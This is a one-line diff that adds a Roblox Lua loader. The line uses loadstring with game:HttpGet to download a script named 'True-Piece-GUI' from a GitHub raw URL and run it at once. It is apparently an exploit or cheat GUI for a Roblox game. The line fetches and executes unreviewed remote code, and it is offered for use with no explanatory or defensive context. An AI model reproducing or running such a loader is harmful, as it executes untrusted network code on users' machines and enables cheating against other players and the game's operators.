@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/simulatorwinner/scripts/main/True-Piece-GUI.lua"))()
